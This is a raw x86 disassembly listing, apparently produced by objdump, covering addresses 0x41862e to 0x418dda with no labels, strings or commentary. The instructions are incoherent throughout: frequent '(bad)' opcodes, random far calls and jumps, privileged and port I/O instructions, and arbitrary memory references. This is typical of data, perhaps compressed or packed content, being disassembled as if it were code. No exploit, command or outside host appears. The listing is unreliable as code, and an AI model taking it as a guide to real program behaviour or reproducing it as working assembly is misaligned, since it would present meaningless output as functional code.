  41862e:	xor    dh,BYTE PTR [ebx+0x0]
  418631:	xchg   BYTE PTR [ecx-0x2acb677c],bh
  418637:	or     al,0x41
  418639:	jge    0x4186aa
  41863b:	mov    bl,0xdf
  41863d:	out    dx,eax
  41863e:	sbb    cl,ch
  418640:	pop    ecx
  418641:	and    eax,0x3f0ba5a1
  418646:	or     cl,dh
  418648:	push   ss
  418649:	push   ecx
  41864a:	mov    ds:0xe6e77061,eax
  41864f:	(bad)  
  418650:	mov    edx,0x4019dfbe
  418655:	sar    DWORD PTR [edi],1
  418657:	mov    edx,0xb111d7cf
  41865c:	push   ebx
  41865d:	push   esp
  41865e:	sub    ch,BYTE PTR ds:0x5785c734
  418664:	das    
  418665:	lea    esi,[ebp-0x2dd1b3ad]
  41866b:	or     eax,0xf0019f21
  418670:	ror    BYTE PTR [edi-0x5f],1
  418673:	xor    ch,BYTE PTR [ebp+0x14]
  418676:	mov    DWORD PTR [edi+0x34],esi
  418679:	int3   
  41867a:	je     0x41865d
  41867c:	addr16 aaa 
  41867e:	mov    bh,BYTE PTR [eax+0x23]
  418681:	shl    BYTE PTR [ecx-0x57],1
  418684:	and    BYTE PTR ds:0xe2cc422f,cl
  41868a:	dec    edx
  41868b:	lods   al,BYTE PTR ds:[esi]
  41868c:	pop    ebp
  41868d:	lods   eax,DWORD PTR ds:[esi]
  41868e:	test   DWORD PTR [ecx],0x4dc17405
  418694:	mov    bh,0x23
  418696:	retf   0x4fee
  418699:	pop    ebp
  41869a:	mov    esi,0xbdf13ec0
  41869f:	out    0xdf,al
  4186a1:	jl     0x418635
  4186a3:	or     eax,0xec962288
  4186a8:	js     0x4186f2
  4186aa:	inc    ecx
  4186ab:	fdiv   QWORD PTR [edi]
  4186ad:	ds inc ebx
  4186af:	rcr    cl,0x1c
  4186b2:	add    DWORD PTR [esi],edi
  4186b4:	iret   
  4186b5:	or     al,0xde
  4186b7:	adc    DWORD PTR [esi],esp
  4186b9:	fidivr WORD PTR [esi+ebp*1+0x5031f5ef]
  4186c0:	jle    0x4186ce
  4186c2:	jl     0x4186d0
  4186c4:	mov    eax,ds:0x9c914b2
  4186c9:	dec    ebx
  4186ca:	loope  0x4186d9
  4186cc:	sub    al,0x97
  4186ce:	rcl    BYTE PTR [ebx-0x4f],1
  4186d1:	fs (bad) 
  4186d4:	push   0xffffff8e
  4186d6:	add    bl,BYTE PTR [ebp+0x7b05ad75]
  4186dc:	outs   dx,BYTE PTR ds:[esi]
  4186dd:	and    al,0x5d
  4186df:	int3   
  4186e0:	xor    dl,dh
  4186e2:	push   0x18
  4186e4:	sbb    DWORD PTR [edi+0x5e],0xffffffab
  4186e8:	or     dh,BYTE PTR [ebp-0x6]
  4186eb:	dec    ebx
  4186ec:	call   0x1cb09928
  4186f1:	pop    esp
  4186f2:	test   al,0x88
  4186f4:	scas   al,BYTE PTR es:[edi]
  4186f5:	cmp    BYTE PTR [ebp+edx*1-0x74519c0c],cl
  4186fc:	lods   al,BYTE PTR ds:[esi]
  4186fd:	sub    BYTE PTR [ecx+0x1c],ch
  418700:	pushf  
  418701:	mov    dh,dh
  418703:	pop    eax
  418704:	ja     0x418746
  418706:	outs   dx,BYTE PTR ds:[esi]
  418707:	aam    0x36
  418709:	mov    ch,0xed
  41870b:	mov    bl,0xbe
  41870d:	dec    esi
  41870e:	push   edi
  41870f:	and    BYTE PTR [ebx+0x72],bl
  418712:	inc    ebp
  418713:	and    al,BYTE PTR [ebp+0x72]
  418716:	pop    ebx
  418717:	and    DWORD PTR [edx],eax
  418719:	adc    eax,0xa3d86ff5
  41871e:	test   al,0x1f
  418720:	push   ebp
  418721:	jecxz  0x4186a3
  418723:	sbb    eax,0x7ebc006d
  418728:	std    
  418729:	inc    ebx
  41872a:	fdivr  DWORD PTR [ebx+0x4c]
  41872d:	xor    ebx,DWORD PTR [esi+0x1880c656]
  418733:	jne    0x418799
  418735:	sbb    DWORD PTR [ecx],esi
  418737:	in     eax,0xa9
  418739:	adc    DWORD PTR [ecx+eax*4+0x128827b7],0xb114c56f
  418744:	mov    al,0xad
  418746:	push   cs
  418747:	(bad)  
  418748:	out    dx,eax
  418749:	pop    esi
  41874a:	and    esi,DWORD PTR [edx+0x5f]
  41874d:	sbb    DWORD PTR fs:[ebx+eax*2-0x366755b2],eax
  418755:	mov    esi,DWORD PTR [ecx-0x24]
  418758:	mov    ch,0xb3
  41875a:	mov    cl,0xaa
  41875c:	loop   0x418747
  41875e:	inc    ebp
  41875f:	and    DWORD PTR [eax+eax*2+0x70],esi
  418763:	nop
  418764:	xchg   edi,esi
  418766:	bound  ebx,QWORD PTR [esi-0x192d0f69]
  41876c:	or     al,0xcf
  41876f:	or     BYTE PTR [edx+esi*4-0x21011b23],0x95
  418777:	leave  
  418778:	imul   esp,esi,0xffffffb2
  41877b:	rcr    DWORD PTR [ebp+0x740b2b32],0xef
  418782:	sahf   
  418783:	cld    
  418784:	xor    ebx,eax
  418786:	es aad 0x93
  418789:	adc    BYTE PTR [edi],ah
  41878b:	adc    eax,0xf3e20891
  418790:	rol    ebx,cl
  418792:	inc    ebp
  418793:	out    dx,eax
  418794:	jns    0x418722
  418796:	std    
  418797:	fwait
  418798:	jo     0x418786
  41879a:	pop    edx
  41879b:	int    0x8a
  41879d:	sbb    dl,bh
  41879f:	sub    eax,0x8d61410f
  4187a4:	dec    ecx
  4187a5:	inc    esi
  4187a6:	inc    eax
  4187a7:	(bad)  
  4187a8:	fisubr DWORD PTR [ecx+0x369bf2a4]
  4187ae:	jno    0x4187c5
  4187b0:	aad    0x2a
  4187b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187b3:	ss or  al,0xa1
  4187b6:	and    al,cl
  4187b8:	loope  0x418792
  4187ba:	(bad)
  4187bd:	ss enter 0xdd76,0x45
  4187c2:	cmp    DWORD PTR [esi+esi*4],ebx
  4187c5:	loopne 0x4187b7
  4187c7:	cmp    dl,bl
  4187c9:	mov    dh,dh
  4187cb:	cs add al,0xc
  4187ce:	add    DWORD PTR [eax+0x766ff9c1],ebp
  4187d4:	ja     0x41877c
  4187d6:	(bad)  
  4187d7:	shl    ebp,1
  4187d9:	lea    ebp,[eax+0x48]
  4187dc:	xor    ebx,DWORD PTR [edi-0x358a436a]
  4187e2:	(bad)  
  4187e3:	mov    ds:0x5424909d,al
  4187e8:	add    al,0xd6
  4187ea:	in     eax,dx
  4187eb:	or     dl,BYTE PTR [esi+eiz*1]
  4187ee:	jns    0x418839
  4187f0:	hlt    
  4187f1:	xor    eax,DWORD PTR [ebp+0x7b7e01b1]
  4187f7:	mov    ch,0xb7
  4187f9:	push   eax
  4187fa:	sub    al,0x9d
  4187fc:	or     al,0x2a
  4187fe:	icebp  
  4187ff:	shr    BYTE PTR [edi-0x68e433ae],cl
  418805:	enter  0xff2f,0x36
  418809:	icebp  
  41880a:	adc    bl,BYTE PTR [edx]
  41880c:	inc    ebx
  41880d:	adc    ebp,edi
  41880f:	sub    al,0x3c
  418811:	test   dh,dh
  418813:	pop    ebp
  418814:	into   
  418815:	scas   eax,DWORD PTR es:[edi]
  418816:	ins    DWORD PTR es:[edi],dx
  418817:	push   0x8da6bba4
  41881c:	imul   ecx,DWORD PTR [esi-0x79],0xaf3c6a96
  418823:	aas    
  418824:	jne    0x418835
  418826:	mov    ebx,0x24d01f26
  41882b:	lea    edi,[esi]
  41882d:	sub    eax,0x7065e594
  418832:	pushf  
  418833:	mov    ebp,0x8cc1d2b3
  418838:	xor    ah,BYTE PTR [edi-0x42e6c0cb]
  41883e:	adc    DWORD PTR [ecx-0x32a617],ebp
  418844:	bound  eax,QWORD PTR [edx]
  418846:	mov    ds:0x68d63abd,eax
  41884b:	mov    esp,0x2cccd69e
  418850:	ins    DWORD PTR es:[edi],dx
  418851:	pop    esp
  418852:	jg     0x418824
  418854:	loop   0x41882d
  418856:	xor    eax,0xd910215f
  41885b:	mov    bh,0x9f
  41885d:	cmp    ah,cl
  41885f:	mov    cl,0x83
  418861:	arpl   WORD PTR [esi+0x0],ax
  418864:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418865:	shl    al,0x2c
  418868:	retf   0x2aae
  41886b:	sub    bl,ch
  41886d:	pop    ss
  41886e:	pop    ebp
  41886f:	add    bh,ah
  418871:	inc    edx
  418872:	test   al,0xee
  418874:	dec    edx
  418875:	loopne 0x41889a
  418877:	push   edi
  418878:	shl    DWORD PTR [ebx+ecx*2+0xe],cl
  41887c:	xlat   BYTE PTR ds:[ebx]
  41887d:	pop    es
  41887e:	call   0x60a1:0xb9009d72
  418885:	pop    ss
  418886:	sysret 
  418888:	test   al,0xe
  41888a:	gs push cs
  41888c:	iret   
  41888d:	sti    
  41888e:	sbb    dh,ch
  418890:	call   0x202d3533
  418895:	and    bl,bh
  418897:	fnstsw WORD PTR [ebx-0x1e]
  41889a:	iret   
  41889b:	dec    ebx
  41889c:	outs   dx,BYTE PTR ds:[esi]
  41889d:	and    DWORD PTR [edx],ecx
  41889f:	mov    ds:0xcfb734b8,eax
  4188a4:	sub    eax,0x8493a40d
  4188a9:	popf   
  4188aa:	sub    BYTE PTR [edx],bh
  4188ac:	scas   al,BYTE PTR es:[edi]
  4188ad:	adc    dl,BYTE PTR [ebx-0x18]
  4188b0:	push   edi
  4188b1:	add    BYTE PTR [eax+0x5b],al
  4188b4:	jae    0x418855
  4188b6:	mov    ebx,0xf4c8a923
  4188bb:	out    dx,al
  4188bc:	iret   
  4188bd:	test   eax,0x699a3df8
  4188c2:	dec    ecx
  4188c3:	push   esp
  4188c4:	mov    cl,BYTE PTR [esi+edx*1+0x78]
  4188c8:	iret   
  4188c9:	imul   edi,DWORD PTR [edi-0x67],0x5e
  4188cd:	xor    DWORD PTR [edi+0x46dbe950],ebp
  4188d3:	jmp    0x204c588a
  4188d8:	hlt    
  4188d9:	js     0x418883
  4188db:	push   0xffffffaa
  4188dd:	add    al,BYTE PTR [ecx+eax*2]
  4188e0:	dec    ebx
  4188e1:	push   ss
  4188e2:	fmul   QWORD PTR [eax+0x19]
  4188e5:	ins    BYTE PTR es:[edi],dx
  4188e6:	repz jnp 0x4188d9
  4188e9:	fist   WORD PTR [eax+0xb9b331c]
  4188f0:	addr16 fs stc 
  4188f3:	push   esp
  4188f4:	fcomp  DWORD PTR [ebx-0xe2d0dfa]
  4188fa:	test   DWORD PTR [ecx+ebx*2-0x19d58602],0xd1c32ed8
  418905:	or     eax,DWORD PTR [edi+0x64a61fb0]
  41890b:	hlt    
  41890c:	jae    0x418983
  41890e:	jne    0x4188db
  418910:	or     ch,ch
  418912:	add    BYTE PTR [ebx+0x7c4df4f2],0xba
  418919:	ins    BYTE PTR es:[edi],dx
  41891a:	bound  ecx,QWORD PTR [edx]
  41891c:	mov    dl,0xaf
  41891e:	cmp    eax,0xf24e189
  418923:	sbb    eax,0x234c76d6
  418928:	sbb    DWORD PTR [ecx+ebx*2-0x6c],eax
  41892c:	cwde   
  41892d:	jmp    0x3d77dbd9
  418932:	shr    DWORD PTR [ebp-0x40],1
  418935:	xchg   DWORD PTR [ecx+0x462c18c4],ecx
  41893b:	sub    eax,0x1a8c87a7
  418940:	xor    BYTE PTR [edx+0x57544a01],cl
  418946:	cdq    
  418947:	aam    0x16
  418949:	xchg   esp,eax
  41894a:	pop    esi
  41894b:	mov    dh,0x18
  41894d:	(bad)  [ecx-0x6e]
  418950:	mov    dh,0x1a
  418952:	push   eax
  418953:	mov    eax,0x264d1dbe
  418958:	sub    eax,0xb95ccb68
  41895d:	inc    eax
  41895e:	jno    0x41895d
  418960:	loope  0x418944
  418962:	nop
  418963:	repnz fcom DWORD PTR [edx+0x1e]
  418967:	jmp    0x418919
  418969:	fisubr DWORD PTR [edi-0x56]
  41896c:	lea    edx,[ecx+0x61]
  41896f:	add    cl,BYTE PTR [eax+0x50e73e79]
  418975:	xchg   ecx,eax
  418976:	sub    al,0x20
  418978:	pop    esi
  418979:	push   ecx
  41897a:	and    DWORD PTR [ebp+0x3],0x7fb3363c
  418981:	push   edi
  418982:	scas   eax,DWORD PTR es:[edi]
  418983:	pop    edx
  418984:	mov    ecx,esi
  418986:	call   0xabd59369
  41898b:	sbb    al,0xe9
  41898d:	fist   WORD PTR [ebx+0x79]
  418990:	mov    al,0xa1
  418992:	cmp    dl,BYTE PTR [ebx]
  418994:	jbe    0x41895f
  418996:	inc    edi
  418997:	pop    eax
  418998:	inc    edx
  418999:	rcl    DWORD PTR [edx],1
  41899b:	les    ecx,FWORD PTR [edx+0x7d072bd6]
  4189a1:	jae    0x418943
  4189a3:	(bad)  
  4189a4:	hlt    
  4189a5:	in     al,0x79
  4189a7:	loopne 0x418a21
  4189a9:	stos   DWORD PTR es:[edi],eax
  4189aa:	sub    DWORD PTR [ebx-0x44],ebp
  4189ad:	adc    al,0xc5
  4189af:	mov    cl,0x7f
  4189b1:	push   es
  4189b2:	push   ds
  4189b3:	test   al,0xb7
  4189b5:	bsf    eax,ebp
  4189b8:	jo     0x418987
  4189ba:	(bad)  
  4189bb:	in     al,dx
  4189bc:	jge    0x41896f
  4189be:	rol    bh,0xac
  4189c1:	dec    edi
  4189c2:	js     0x418a41
  4189c4:	in     al,dx
  4189c5:	fisub  WORD PTR [ebx]
  4189c7:	cwde   
  4189c8:	adc    al,0x6
  4189ca:	scas   eax,DWORD PTR es:[di]
  4189cc:	popa   
  4189cd:	adc    DWORD PTR [ebp-0x2d],esi
  4189d0:	fs pop ecx
  4189d2:	outs   dx,BYTE PTR ds:[esi]
  4189d3:	xchg   edx,eax
  4189d4:	loop   0x418971
  4189d6:	mov    dl,0x1e
  4189d8:	jmp    0x418a1d
  4189da:	or     eax,0xd27fc482
  4189df:	in     eax,dx
  4189e0:	adc    eax,0x9f0f34ae
  4189e5:	adc    ebx,esi
  4189e7:	test   DWORD PTR [edi],edi
  4189e9:	inc    ecx
  4189ea:	jno    0x4189d6
  4189ec:	jl     0x418981
  4189ee:	sub    DWORD PTR [esi+0x2b],edi
  4189f1:	pop    ecx
  4189f3:	and    esi,DWORD PTR [ecx+0x818d096]
  4189f9:	lea    esi,[esi+ecx*2+0x25e984c1]
  418a00:	push   edx
  418a01:	sub    ah,BYTE PTR [esi-0x2d]
  418a04:	fwait
  418a05:	xor    al,0x31
  418a07:	cdq    
  418a08:	jnp    0x418a36
  418a0a:	dec    ecx
  418a0b:	xor    DWORD PTR [edi+0x62],ebp
  418a0e:	mov    edx,DWORD PTR [eax+0x7a]
  418a11:	fs jecxz 0x4189c8
  418a14:	sub    DWORD PTR [ebx+0x23],0xfffffffe
  418a18:	lds    esi,FWORD PTR [edx+0x17]
  418a1b:	mov    cl,BYTE PTR [edi+ebx*4]
  418a1e:	or     esi,DWORD PTR [ecx+0xa]
  418a21:	fdivr  QWORD PTR [eax+ecx*2+0x1f13e4a4]
  418a28:	das    
  418a29:	rcr    BYTE PTR [edi-0x42],1
  418a2c:	push   esi
  418a2d:	scas   al,BYTE PTR es:[edi]
  418a2e:	ins    DWORD PTR es:[edi],dx
  418a2f:	mov    ds:0x2f305dca,eax
  418a34:	sbb    edi,ecx
  418a36:	add    al,0x4b
  418a38:	cmp    DWORD PTR [esi],eax
  418a3a:	stc    
  418a3b:	add    DWORD PTR [ebx],0x74
  418a3e:	shl    DWORD PTR [ebx-0x5ded199f],cl
  418a44:	loope  0x4189fa
  418a46:	in     eax,0x7
  418a48:	int    0x6b
  418a4a:	imul   eax,DWORD PTR [eax],0xc7a27be7
  418a50:	jle    0x418a20
  418a52:	outs   dx,BYTE PTR ds:[esi]
  418a53:	rcl    BYTE PTR [esp+ebx*8+0x33d06d74],cl
  418a5a:	xor    al,0xe3
  418a5c:	aad    0x0
  418a5e:	bound  esi,QWORD PTR [edi]
  418a60:	mov    edi,DWORD PTR [ebx+0x2b071146]
  418a66:	mov    esi,0xae19c281
  418a6b:	or     BYTE PTR [ebx],bh
  418a6d:	cld    
  418a6e:	retf   0x8b14
  418a71:	inc    esi
  418a72:	data16 (bad) 
  418a74:	cmp    DWORD PTR [esp+ecx*1+0x35],edx
  418a78:	or     bh,BYTE PTR [ebp+0x5d]
  418a7b:	ja     0x418a6b
  418a7d:	sub    ebx,DWORD PTR [ebx+0x53]
  418a80:	mov    al,ds:0xe6a39b27
  418a85:	mov    ch,cl
  418a87:	neg    DWORD PTR ds:0x8019df1a
  418a8d:	xlat   BYTE PTR ds:[ebx]
  418a8e:	mov    edi,0xe188f7d4
  418a93:	mov    eax,0xae0ffa30
  418a98:	mov    edx,0x80a15d77
  418a9d:	xor    BYTE PTR [ebx-0x39],ch
  418aa0:	ficom  WORD PTR [edx]
  418aa2:	into   
  418aa3:	data16 adc ah,bh
  418aa6:	adc    eax,0x79d63814
  418aab:	ret    
  418aac:	std    
  418aad:	sbb    al,0xb5
  418aaf:	xlat   BYTE PTR ds:[ebx]
  418ab0:	mov    ds:0x4d4cf567,al
  418ab5:	push   esp
  418ab6:	std    
  418ab7:	loop   0x418aab
  418ab9:	xchg   cl,bh
  418abb:	sbb    al,0x42
  418abd:	mov    ecx,0xb323a0b
  418ac2:	mov    ch,0xea
  418ac4:	xor    esi,DWORD PTR [ebp+0x41]
  418ac7:	xchg   edx,eax
  418ac8:	call   0x2aceeb7e
  418acd:	sub    eax,0x775c15f3
  418ad2:	add    eax,0xa09b0178
  418ad7:	hlt    
  418ad8:	and    bl,BYTE PTR ds:[edi+0x3d0a4c5b]
  418adf:	xchg   edx,eax
  418ae0:	pop    ebx
  418ae1:	add    DWORD PTR [edx-0x79],edx
  418ae4:	loope  0x418b3e
  418ae6:	out    0x44,eax
  418ae8:	or     al,0x50
  418aea:	jb     0x418abd
  418aec:	pop    esi
  418aed:	hlt    
  418aee:	std    
  418aef:	ins    DWORD PTR es:[edi],dx
  418af0:	in     al,dx
  418af1:	inc    ebx
  418af2:	mov    cs,WORD PTR [ebx-0x1b]
  418af5:	ins    BYTE PTR es:[edi],dx
  418af6:	inc    eax
  418af7:	and    eax,0x650eb878
  418afc:	(bad)  
  418afd:	xor    al,0x59
  418aff:	test   DWORD PTR [eax+ecx*8],edx
  418b02:	push   edx
  418b03:	xchg   ecx,eax
  418b04:	inc    ebx
  418b05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b06:	fdivr  QWORD PTR [ebx+ebp*4+0x14]
  418b0a:	jbe    0x418ace
  418b0c:	stc    
  418b0d:	fwait
  418b0e:	and    al,0x49
  418b10:	mov    edx,0x3b4beeaf
  418b15:	or     eax,0x1d9304b0
  418b1a:	ds jge 0x418b08
  418b1d:	sar    BYTE PTR [esi],cl
  418b1f:	xor    DWORD PTR fs:[ebx-0xfefdfa2],ebx
  418b26:	add    DWORD PTR [edx],edi
  418b28:	dec    ebx
  418b29:	xchg   edi,eax
  418b2a:	retf   0xfe08
  418b2d:	sbb    edx,ebp
  418b2f:	inc    edx
  418b30:	punpckhbw xmm5,xmm3
  418b34:	int    0x5c
  418b36:	lods   al,BYTE PTR ds:[esi]
  418b37:	stos   DWORD PTR es:[edi],eax
  418b38:	inc    ebx
  418b39:	add    bl,bl
  418b3b:	sbb    edi,DWORD PTR [eax]
  418b3d:	xchg   ecx,eax
  418b3e:	jno    0x418b53
  418b40:	leave  
  418b41:	sub    al,0x2e
  418b43:	cmp    esp,DWORD PTR [eax]
  418b45:	pop    edi
  418b46:	mov    ch,0x58
  418b48:	stos   DWORD PTR es:[edi],eax
  418b49:	add    esi,edx
  418b4b:	dec    ebp
  418b4c:	daa    
  418b4d:	call   0xab4b:0xaa3cd11
  418b54:	cdq    
  418b55:	pop    edi
  418b56:	xchg   edi,eax
  418b57:	mov    dh,BYTE PTR [edx-0x295b29e0]
  418b5d:	sub    DWORD PTR [edx],edi
  418b5f:	ins    BYTE PTR es:[edi],dx
  418b60:	(bad)  
  418b63:	in     eax,0x49
  418b65:	push   eax
  418b66:	or     cl,BYTE PTR [ecx]
  418b68:	add    eax,0x99f2a334
  418b6d:	pop    ebx
  418b6e:	(bad)  
  418b70:	repz inc eax
  418b72:	adc    DWORD PTR [ecx+ecx*2-0x66],ebx
  418b76:	sahf   
  418b77:	fldcw  WORD PTR ds:[ebx]
  418b7a:	or     DWORD PTR [edi+0x3c],edi
  418b7d:	aam    0xe7
  418b7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b80:	pusha  
  418b81:	and    al,0x3a
  418b83:	retf   0x82bd
  418b86:	fnstsw WORD PTR [ebx+0xddd7b0c]
  418b8c:	pop    ebx
  418b8d:	jge    0x418b11
  418b8f:	xor    DWORD PTR [edx-0x73],esp
  418b92:	xchg   ebx,eax
  418b93:	mov    fs,WORD PTR [esp+ebp*2]
  418b96:	mov    ebx,0x761474d2
  418b9b:	mov    edi,0x3f7d7bbd
  418ba0:	ins    DWORD PTR es:[edi],dx
  418ba1:	(bad)  
  418ba2:	aam    0x4c
  418ba4:	xchg   esp,eax
  418ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ba6:	mov    ch,0x38
  418ba8:	mov    ch,BYTE PTR gs:[ebx+0x78a58b3b]
  418baf:	fwait
  418bb0:	imul   esp,DWORD PTR [edi-0x2a86d30c],0x60
  418bb7:	cmc    
  418bb8:	lahf   
  418bb9:	and    esp,edx
  418bbb:	dec    ebx
  418bbc:	pop    ecx
  418bbd:	push   ss
  418bbe:	or     BYTE PTR [ecx-0x3a],ah
  418bc1:	out    dx,eax
  418bc2:	xor    al,BYTE PTR [ecx+0x40]
  418bc5:	jl     0x418bc8
  418bc7:	test   DWORD PTR [edx-0x6],ebx
  418bca:	sub    eax,0x9daedc48
  418bcf:	mov    ecx,DWORD PTR [bx+0x44f0]
  418bd4:	mov    eax,ds:0x9f731580
  418bd9:	call   0xfdc0:0x9e55029d
  418be0:	fiadd  WORD PTR ds:0x9d98dd6c
  418be6:	jl     0x418bcb
  418be8:	ins    DWORD PTR es:[di],dx
  418bea:	stos   BYTE PTR es:[edi],al
  418beb:	jns    0x418c3c
  418bed:	mov    WORD PTR fs:[edi+0x47],?
  418bf1:	pop    ecx
  418bf2:	in     eax,dx
  418bf3:	mov    ds:0x3be20736,eax
  418bf8:	lods   al,BYTE PTR ds:[esi]
  418bf9:	ret    
  418bfa:	mov    bl,BYTE PTR [bx+0x70]
  418bfe:	sbb    eax,0x4b4c2db6
  418c03:	popa   
  418c04:	adc    DWORD PTR [esi+0x31be3287],0xffffffef
  418c0b:	scas   al,BYTE PTR es:[edi]
  418c0c:	sub    BYTE PTR [esi],dl
  418c0e:	idiv   dh
  418c10:	fldlg2 
  418c12:	mov    ecx,cs
  418c14:	in     al,0x88
  418c16:	add    BYTE PTR [ecx-0x67130b3e],dh
  418c1c:	stc    
  418c1d:	push   0x11
  418c1f:	push   ebx
  418c20:	outs   dx,DWORD PTR ds:[esi]
  418c21:	jl     0x418c34
  418c23:	adc    ebp,esi
  418c25:	in     al,0x5a
  418c27:	sub    ecx,esp
  418c29:	ds (bad) 
  418c2b:	rcl    DWORD PTR [esi-0x410b8f13],1
  418c31:	iret   
  418c32:	cmp    BYTE PTR [edi-0x7d20dc68],0xfa
  418c39:	(bad)  
  418c3a:	repnz scas eax,DWORD PTR es:[edi]
  418c3c:	int3   
  418c3d:	cs enter 0x4b42,0x2
  418c42:	stos   BYTE PTR es:[edi],al
  418c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c44:	mov    ah,ah
  418c46:	add    eax,0x3429c2ca
  418c4b:	push   ebx
  418c4c:	and    al,0x2f
  418c4e:	gs ja  0x418c5b
  418c51:	sbb    BYTE PTR [eax+ebp*1],dh
  418c54:	mov    ds:0xe8dd5d1d,al
  418c59:	mov    fs,esp
  418c5b:	pop    ecx
  418c5c:	(bad)  
  418c5d:	pop    ebp
  418c5e:	dec    eax
  418c5f:	cmp    bh,BYTE PTR [edi+0x540d2c8a]
  418c65:	mov    bl,ah
  418c67:	pop    esi
  418c68:	(bad)  
  418c69:	imul   esp,DWORD PTR [ecx],0xf
  418c6c:	call   0x2486:0xf993d24a
  418c73:	mov    ecx,0xddfd01c1
  418c78:	add    cl,dl
  418c7a:	xchg   edi,eax
  418c7b:	xchg   edx,eax
  418c7c:	push   ecx
  418c7d:	jecxz  0x418c4c
  418c7f:	dec    edi
  418c80:	outs   dx,BYTE PTR ds:[esi]
  418c81:	jecxz  0x418c63
  418c83:	xor    eax,0x90a9b036
  418c88:	xchg   esp,eax
  418c89:	stos   BYTE PTR es:[edi],al
  418c8a:	dec    ebp
  418c8b:	arpl   WORD PTR [ebx+0x6f],sp
  418c8e:	pop    es
  418c8f:	mov    ?,WORD PTR [edi-0x54]
  418c92:	add    BYTE PTR [esi-0x3c],dl
  418c95:	push   0xffffff80
  418c97:	imul   ebp,DWORD PTR [ecx],0xad57756f
  418c9d:	std    
  418c9e:	shl    BYTE PTR [ecx+eax*4-0x5c],1
  418ca2:	sub    BYTE PTR [edx-0xe405355],0xbf
  418ca9:	mov    edx,0x51be84
  418cae:	xchg   ebx,eax
  418caf:	mov    WORD PTR [eax],cs
  418cb1:	stos   BYTE PTR es:[edi],al
  418cb2:	in     eax,0x18
  418cb4:	lods   al,BYTE PTR ds:[esi]
  418cb5:	mov    BYTE PTR [edx+0x7b],dh
  418cb8:	aad    0xf5
  418cba:	ds fs into 
  418cbd:	scas   eax,DWORD PTR es:[edi]
  418cbe:	mov    ds:0x956384d0,al
  418cc3:	ffreep st(4)
  418cc5:	retf   0xd185
  418cc8:	cmp    al,0x58
  418cca:	cmc    
  418ccb:	xchg   ecx,eax
  418ccc:	add    eax,0x25315be7
  418cd1:	xor    DWORD PTR [esi+edi*1+0x5b059443],ecx
  418cd8:	lods   eax,DWORD PTR ds:[esi]
  418cd9:	mov    eax,ds:0x103ecd14
  418cde:	push   edi
  418cdf:	mov    bl,0xa0
  418ce1:	fdiv   QWORD PTR [edi+ebp*8]
  418ce4:	xor    al,0xc6
  418ce6:	(bad)  
  418ce7:	and    ch,cl
  418ce9:	leave  
  418cea:	jl     0x418d47
  418cec:	sbb    eax,0x99e6f807
  418cf1:	jae    0x418cfb
  418cf3:	fwait
  418cf4:	int3   
  418cf5:	ror    DWORD PTR ds:0x55341287,1
  418cfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cfc:	scas   eax,DWORD PTR es:[edi]
  418cfd:	fisttp DWORD PTR [esi+0x2b]
  418d00:	into   
  418d01:	imul   esi,DWORD PTR [ebx+ecx*1-0x7e],0x20253103
  418d09:	add    eax,0x3608b5ae
  418d0e:	sahf   
  418d0f:	inc    eax
  418d10:	fst    QWORD PTR [esi]
  418d12:	sub    ch,dl
  418d14:	std    
  418d15:	aas    
  418d16:	shl    DWORD PTR [ecx],1
  418d18:	fdiv   st,st(1)
  418d1a:	jnp    0x418d16
  418d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d1d:	xor    ebp,ebx
  418d1f:	pop    ecx
  418d20:	retf   0xa384
  418d23:	ds dec ebp
  418d25:	enter  0x5e7e,0x2a
  418d29:	or     eax,0x8d7b1ce1
  418d2e:	(bad)  
  418d2f:	fbstp  TBYTE PTR [eax]
  418d31:	nop
  418d32:	jmp    0x19e6:0xd99092e8
  418d39:	repz lahf 
  418d3b:	test   DWORD PTR [ecx-0x14ac973f],ebp
  418d41:	xor    al,BYTE PTR [ebx-0x334f50e9]
  418d47:	inc    eax
  418d48:	mov    ds:0xf893520a,eax
  418d4d:	sbb    al,0x30
  418d4f:	cmp    ch,dh
  418d51:	outs   dx,DWORD PTR ds:[esi]
  418d52:	jp     0x418cea
  418d54:	cmp    BYTE PTR [edx],ah
  418d56:	mov    ch,BYTE PTR ds:0xf00082bd
  418d5c:	inc    edx
  418d5d:	bswap  ecx
  418d5f:	jno    0x418ce6
  418d61:	dec    edx
  418d62:	xchg   ecx,eax
  418d63:	mov    dh,0xb9
  418d65:	mov    ebp,0x72affa6d
  418d6a:	(bad)  
  418d6c:	mov    esp,0xb8b8690a
  418d71:	pop    edi
  418d72:	fldenv [ebx+0x51]
  418d75:	xchg   dh,ch
  418d77:	fnstenv [eax]
  418d79:	inc    edx
  418d7a:	fucomip st,st(2)
  418d7c:	pop    eax
  418d7d:	and    al,0x85
  418d7f:	inc    edi
  418d80:	(bad)  
  418d82:	int3   
  418d83:	ds (bad) 
  418d85:	out    0x3,al
  418d87:	add    dl,bh
  418d89:	xchg   ecx,eax
  418d8a:	pop    edi
  418d8b:	ror    BYTE PTR [ebx+ebx*4-0x225924ae],1
  418d92:	xor    edx,DWORD PTR [esi]
  418d94:	stos   BYTE PTR es:[edi],al
  418d95:	pushf  
  418d96:	jecxz  0x418d8a
  418d98:	inc    ecx
  418d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d9a:	xor    al,0xdb
  418d9c:	push   ecx
  418d9d:	adc    al,0xce
  418d9f:	sahf   
  418da0:	jmp    0x4aa5:0xd0ad54a0
  418da7:	pop    eax
  418da8:	or     DWORD PTR [ecx-0x6eafc048],0xdd258519
  418db2:	pushf  
  418db3:	inc    esi
  418db4:	mov    ebp,0x307056d5
  418db9:	retf   0xe387
  418dbc:	adc    DWORD PTR [ecx],ebx
  418dbe:	cmp    dl,ch
  418dc0:	(bad)  
  418dc1:	call   0x8020:0x4371e3d4
  418dc8:	or     edi,DWORD PTR [ebp-0x44]
  418dcb:	pop    esp
  418dcc:	mov    ecx,0xeb075e11
  418dd1:	push   eax
  418dd2:	stos   DWORD PTR es:[edi],eax
  418dd3:	aas    
  418dd4:	dec    esp
  418dd5:	xchg   ecx,eax
  418dd6:	pushf  
  418dd7:	retf   
  418dd8:	xor    dl,BYTE PTR [edi]
  418dda:	mov    ah,0xf7
